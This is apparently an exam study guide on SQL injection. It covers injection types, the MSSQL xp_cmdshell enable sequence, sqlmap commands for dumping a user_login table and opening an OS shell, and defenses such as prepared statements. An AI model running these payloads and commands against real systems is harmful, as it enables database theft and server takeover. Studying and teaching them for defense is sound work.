# Module 15: SQL Injection

## Tier 1: Core Concepts & Principles

### SQL Injection Fundamentals & Root Cause
* **SQL Injection (SQLi) Definition:** A high-severity code injection vulnerability that occurs when untrusted user-supplied input is directly concatenated into dynamic SQL query strings without prior sanitization or parameterization.
* **Impact Mechanics:** Allows attackers to bypass authentication mechanisms, read/dump sensitive database tables, modify or delete database records, execute administrative database operations, and—under high-privilege conditions—achieve underlying Operating System command execution (RCE).
* **Core Vulnerability Mechanism:**
  $$\text{Vulnerable Pattern: } \texttt{SELECT * FROM users WHERE username = '} + \text{userInput} + \texttt{' AND password = '} + \text{passInput} + \texttt{'}$$
  When input contains SQL syntax characters (e.g., `' OR '1'='1`), the parser's logic is altered to evaluate truthy conditions unconditionally.

---

## Tier 2: Technical Analysis & Mechanics

### SQL Injection Taxonomy & Attack Vectors

| Attack Category | Sub-Type | Execution & Extraction Mechanism | Performance & Data Transfer Rate |
| :--- | :--- | :--- | :--- |
| **In-Band (Classic)** | **Error-Based** | Triggers deliberate database error messages that output raw table data or server details directly onto the web page. | Fast (Direct extraction) |
| **In-Band (Classic)** | **UNION-Based** | Appends query results using `UNION SELECT` to merge rows from attacker-targeted tables with the original query output. | Very Fast (High volume per HTTP response) |
| **Inferential (Blind)** | **Boolean-Based** | Evaluates true/false SQL conditions by observing subtle structural variations in the web application's HTTP response body/status code. | Slow (Extracted character-by-character) |
| **Inferential (Blind)** | **Time-Based** | Injects heavy database sleep/delay functions (e.g., `WAITFOR DELAY '0:0:5'`, `pg_sleep(5)`) to infer character values based on server response latency. | Very Slow (High request overhead) |
| **Out-of-Band (OOB)** | **DNS / SMB Exfiltration** | Triggers external DNS lookups or UNC path SMB queries (e.g., `xp_dirtree`, `UTL_HTTP`) to log extracted data on an attacker-controlled listener. | Fast (Bypasses HTTP response filters) |

### Advanced Exploitation: MSSQL OS Command Execution (`xp_cmdshell`)
* **Execution Flow:**
  1. Attacker verifies administrative privileges (`sysadmin` / `sa` account role).
  2. Enables advanced configuration options: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;`
  3. Activates the extended stored procedure: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
  4. Invokes OS shell commands directly: `EXEC xp_cmdshell 'whoami';` or executes interactive command payloads via `sqlmap --os-shell`.

---

## Tier 3: CLI, Tools & Framework Syntax

### Core SQL Injection Tooling
* **sqlmap:** The industry-standard automated tool for detecting, fingerprinting, and exploiting SQL Injection vulnerabilities across diverse DBMS engines.
* **OWASP ZAP:** Web application proxy and security scanner capable of identifying vulnerable SQL parameters via automated fuzzing scripts.
* **ShellGPT (`sgpt`):** AI CLI wrapper used to formulate precise, complex `sqlmap` execution strings from natural language prompts.

### Key Commands & Execution Syntax

```bash
# sqlmap: Basic GET Request Vulnerability Assessment & Database Fingerprinting
sqlmap -u "http://<Target_IP>/profile.php?id=1" --batch

# sqlmap: Authenticated Session Assessment (Injecting Session Cookies)
sqlmap -u "http://<Target_IP>/profile.php?id=1" --cookie="PHPSESSID=abc123sessionid; security=low" --dbs

# sqlmap: Database & Table Enumeration against MSSQL
# Enumerate all database names
sqlmap -u "http://<Target_IP>/profile.php?id=1" --cookie="<SESSION_COOKIE>" --dbs

# Enumerate tables in specific database (-D MovieScope)
sqlmap -u "http://<Target_IP>/profile.php?id=1" --cookie="<SESSION_COOKIE>" -D MovieScope --tables

# Dump columns and contents from specific table (-T user_login)
sqlmap -u "http://<Target_IP>/profile.php?id=1" --cookie="<SESSION_COOKIE>" -D MovieScope -T user_login --dump

# sqlmap: OS Command Shell Escalation (--os-shell)
sqlmap -u "http://<Target_IP>/profile.php?id=1" --cookie="<SESSION_COOKIE>" --os-shell

# ShellGPT AI-Assisted sqlmap Command Generation
sgpt "Generate a sqlmap command to dump the table user_login from database MovieScope on [http://10.10.10.5/profile.php?id=1](http://10.10.10.5/profile.php?id=1) using cookie 'session=xyz'"
```

---

## Tier 4: Real-World Scenarios & Countermeasures

### Defensive Architecture & Mitigation Standards
* **Parameterized Queries / Prepared Statements (Primary Defense):** Enforce strict separation between code logic and user data using parameterized abstractions.
  * *Vulnerable (PHP):* `$db->query("SELECT * FROM users WHERE name = '" . $_GET['name'] . "'");`
  * *Secure (PDO):* `$stmt =$pdo->prepare('SELECT * FROM users WHERE name = :name'); $stmt->execute(['name' =>$_GET['name']]);`
* **Stored Procedures with Safe Parameter Binding:** Use stored procedures that bind inputs strictly as typed data rather than concatenating strings dynamically.
* **Principle of Least Privilege (DBA Hardening):**
  * Restrict database account privileges; the web application user must never run as `sa`, `root`, or `dba`.
  * Disable hazardous extended stored procedures (`xp_cmdshell`, `LOAD_FILE()`, `INTO OUTFILE`) at the DBMS configuration layer.
* **Defense-in-Depth:** Deploy Web Application Firewalls (WAF) to detect common SQLi payloads (e.g., `UNION SELECT`, `OR 1=1`), enforce input validation whitelisting, and suppress detailed database error messages (`display_errors = Off`).

---

## Tier 5: Exam Key Hooks & Rapid Triggers

| Concept / Mechanism | High-Yield Exam Trigger | Critical Distinction |
| :--- | :--- | :--- |
| **Parameterized Queries** | **#1 Defensive Control against SQLi** | Separates code from data; prevents parser manipulation regardless of input contents |
| **`UNION`-Based SQLi** | Combines results from two or more `SELECT` queries into a single HTTP response | Requires exact matching column counts and compatible data types between queries |
| **Error-Based SQLi** | Relies on database error messages to extract data | Rapid extraction; discloses DB engine type and syntax details directly |
| **Boolean-Based Blind SQLi** | Evaluates true/false statements via HTTP response changes | No raw error messages returned; slow character-by-character extraction |
| **Time-Based Blind SQLi** | Injects time delay functions (e.g., `WAITFOR DELAY`, `pg_sleep()`) | Used when the application returns identical responses regardless of query output |
| **MSSQL `xp_cmdshell`** | Extended stored procedure used to execute native OS commands | Requires administrative (`sa`/`sysadmin`) privileges to enable and execute |
| **sqlmap `--dbs`** | Enumerates all accessible databases on the target server | Step 1 in data extraction methodology |
| **sqlmap `--dump`** | Extracts and prints table contents to local log files | Discharges target column data to screen/disk |
| **sqlmap `--os-shell`** | Spawns an interactive operating system command prompt | Exploits DBMS file/command features (e.g., `xp_cmdshell`, `INTO OUTFILE`) |
| **In-Band vs. Blind SQLi** | In-Band uses the same channel for attack and output; Blind relies on side-channel behavior | In-Band directly exposes data; Blind requires inferential techniques |